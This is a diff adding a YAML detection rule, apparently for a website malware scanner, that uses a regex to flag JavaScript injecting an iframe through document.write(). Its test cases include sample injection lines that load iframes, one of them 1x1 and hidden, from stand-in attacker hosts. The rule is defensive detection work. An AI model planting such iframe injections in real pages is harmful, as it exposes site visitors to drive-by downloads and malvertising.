@@ -1,0 +1,18 @@
+id: lw:0003
+kind: regex
+target: file_js
+pattern: 'document\.write\s*\(\s*["'']\s*<iframe'
+flags: i
+sql_like: null
+tier: infected
+category: injector
+name: document.write() injecting a hidden iframe
+description: JavaScript that writes an <iframe> tag into the page via document.write() — the standard delivery mechanism for drive-by-download and malvertising injections.
+common_strings: []
+tests:
+  match:
+    - "document.write('<iframe src=\"http://evil.example/x.js\"></iframe>');"
+    - 'document.write("<iframe width=1 height=1 src=//evil.tld/x></iframe>");'
+  no_match:
+    - "document.write('<div id=\"content\"></div>');"
+    - "console.log('<iframe> tags are blocked here');"
